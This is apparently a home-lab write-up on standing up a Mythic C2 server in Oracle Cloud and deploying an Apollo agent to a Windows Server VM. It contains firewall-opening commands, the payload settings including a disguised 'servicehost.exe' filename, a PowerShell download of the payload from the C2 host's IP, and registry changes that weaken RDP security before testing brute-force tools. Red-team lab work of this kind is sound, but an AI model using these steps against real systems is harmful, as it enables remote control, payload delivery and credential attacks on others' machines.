# Mythic C2 Server Setup and Apollo Agent Deployment

## Infrastructure

Mythic was deployed on Oracle Cloud Free Tier rather than locally, due to host laptop
disk space constraints after building four local VirtualBox VMs.

- **Platform**: Oracle Cloud Always Free (Ampere A1 Flex)
- **Shape**: 1 OCPU / 4GB RAM
- **OS**: Ubuntu 22.04 LTS (ARM64)
- **Region**: Mumbai (ap-mumbai-1)
- **Public IP**: 141.148.194.147

## Installation

```bash
# Install dependencies
sudo apt update && sudo apt upgrade -y
sudo apt-get install docker-compose make git -y

# Add ubuntu user to docker group
sudo usermod -aG docker $USER

# Clone and build Mythic
git clone https://github.com/its-a-feature/Mythic.git
cd Mythic
sudo make

# Configure for external access (not localhost-only)
sudo ./mythic-cli config set mythic_server_bind_localhost_only false
sudo ./mythic-cli config set rabbitmq_bind_localhost_only false

# Start Mythic
sudo ./mythic-cli start

# Install Apollo agent and HTTP C2 profile
sudo chown ubuntu:ubuntu ~/Mythic/.env
sudo chown ubuntu:ubuntu ~/Mythic/docker-compose.yml
sudo ./mythic-cli install github https://github.com/MythicAgents/Apollo.git
sudo ./mythic-cli install github https://github.com/MythicC2Profiles/http
sudo ./mythic-cli start
```

## Firewall configuration

Oracle Cloud's default iptables configuration includes catch-all REJECT rules on both
the FORWARD and INPUT chains that block non-Docker traffic even when Oracle's Security
List (cloud-level firewall) allows the ports.

Fix applied:
```bash
# Allow payload delivery port through INPUT chain
sudo iptables -I INPUT -p tcp --dport 80 -j ACCEPT
sudo iptables -I INPUT -p tcp --dport 9999 -j ACCEPT
sudo iptables -I FORWARD -p tcp --dport 9999 -j ACCEPT
```

Oracle Security List ingress rules added:
- Port 7443 (Mythic web UI)
- Port 80 (Apollo C2 callback)
- Port 9999 (payload delivery via Python HTTP server)

## Payload configuration

Built via Mythic web UI at `https://141.148.194.147:7443`:

| Parameter | Value |
|---|---|
| Payload type | apollo |
| Output type | WinExe |
| Callback host | http://141.148.194.147 |
| Callback port | 80 |
| Callback interval | 10 seconds |
| Callback jitter | 23% |
| Kill date | 2027-09-15 |
| Filename | servicehost.exe |

## Payload delivery

```bash
# On Mythic VM — serve payload via Python HTTP server
cd ~/Mythic/1
nohup python3 -m http.server 9999 &
```

```powershell
# On Windows Server — download payload
Invoke-WebRequest -Uri "http://141.148.194.147:9999/servicehost.exe" `
  -OutFile "C:\Users\Public\Downloads\servicehost.exe"
```

## Result

Active C2 callback confirmed in Mythic web UI (Callbacks page) within 10 seconds of
executing `servicehost.exe` on the Windows Server. Callback interval 10 seconds,
23% jitter.

## RDP prerequisites for Windows Server

The Windows Server required several configuration changes before brute-force tools
would work against it:

```powershell
# Disable NLA (Network Level Authentication)
Set-ItemProperty `
  -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' `
  -Name "UserAuthentication" -Value 0

# Set Security Layer to RDP (not TLS/Negotiate)
Set-ItemProperty `
  -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' `
  -Name "SecurityLayer" -Value 0

Restart-Service TermService -Force
```

Tool compatibility findings:
- **Hydra RDP module**: failed — experimental, does not handle modern Windows Server
  2022 RDP protocol correctly
- **Crowbar**: failed — same root cause as Hydra
- **xfreerdp**: succeeded — manual connection with correct credentials confirmed RDP
  fully functional
- **ncrack**: succeeded — automated brute-force with correct credentials confirmed
  after allowing sufficient time for protocol negotiation (~4.5 minutes)
